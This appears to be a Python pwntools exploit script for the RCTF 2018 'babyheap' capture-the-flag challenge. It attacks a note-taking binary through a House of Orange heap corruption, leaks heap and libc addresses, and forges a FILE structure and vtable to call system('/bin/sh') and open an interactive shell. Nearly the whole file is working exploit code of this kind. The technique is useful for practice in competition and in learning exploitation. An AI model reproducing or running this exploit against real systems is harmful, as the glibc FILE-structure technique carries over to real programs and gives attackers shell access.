from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "babyheap.2018.teamrois.cn"
remote_port = 3154
local_addr = "127.0.0.1"
local_port = 1807

pc = "./note"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0xCB4+0x555555554000\n b *0xD16+0x555555554000\n')
		#b *0x0804887F \n 
		#0x400b6a

def pack_file_64(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0):
    struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    return struct



def ru(a):
	return p.recvuntil(a)


def sn(a):
	p.send(a)

def rl():
	return p.recvline()

def sl(a):
	p.sendline(a)

def rv(a):
	return p.recv(a)

def raddr(a,l=None):
	if l == None:
		return u64(rv(a).ljust(8,'\x00'))
	else:
		return u64(rl().strip('\n').ljust(8,'\x00'))

def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def sa(a,b):
	p.sendafter(a,b)

def sla(a,b):
	p.sendlineafter(a,b)
	
def add_note(size,content):
	sla('Choice>>','1')
	sla('Size:',str(size))
	sla('Content:',content)

def show_note(index):
	sla('Choice>>','2')
	sla('Index:',str(index))

def pandora():
	sla('Choice>>','3')
	sla('1)','1')

def hack():
	raw_input()
	payload = p64(0)*2 + p64(0) + p64(0xec1)
	add_note(0x18,payload)

	add_note(0xff0,'a')

	pandora()
	show_note(0)
	ru('Content:')
	heap_addr = u64(rl()[:-1].ljust(8,'\x00')) - 0x140
	lg('heap_addr',heap_addr)

	add_note(0x88,'a'*8)
	show_note(1)
	ru('Content:')
	top_addr = u64(rv(6).ljust(8,'\x00'))
	lg('top_addr',top_addr)
	libc.address = top_addr - 0x58 - libc.symbols['__malloc_hook'] - 0x10
	lg('libc.address',libc.address)
	system_addr = libc.symbols['system']
	lg('system_addr',system_addr)
	sh_addr = next(libc.search('/bin/sh'))
	#print hex(next(libc.search('/bin/sh')))
	lg('sh_addr',sh_addr)

	_IO_list_all = libc.symbols['_IO_list_all']
	_IO_str_jumps = libc.symbols['_IO_file_jumps'] + 0xc0
	lg('IO_str_jumps',_IO_str_jumps)

	fake_fd = top_addr
	fake_bk = _IO_list_all - 0x10
	payload = p64(0)*2
	payload += pack_file_64(_flags = 0,
						   _IO_read_ptr = 0x61,
						   _IO_read_end = fake_fd,
						   _IO_read_base = fake_bk,
						   _IO_write_base = 2,
						   _IO_write_ptr = 3,
						   _IO_buf_base = sh_addr)
	#vtables = heap_addr + 0xb0 + 0xd8 + 8
	payload += p64(_IO_str_jumps-8)
	payload += p64(0) + p64(system_addr)
	add_note(0x18,payload)
	sla('Choice>>','1')
	sla('Size:',str(10))
	
	p.interactive()

hack()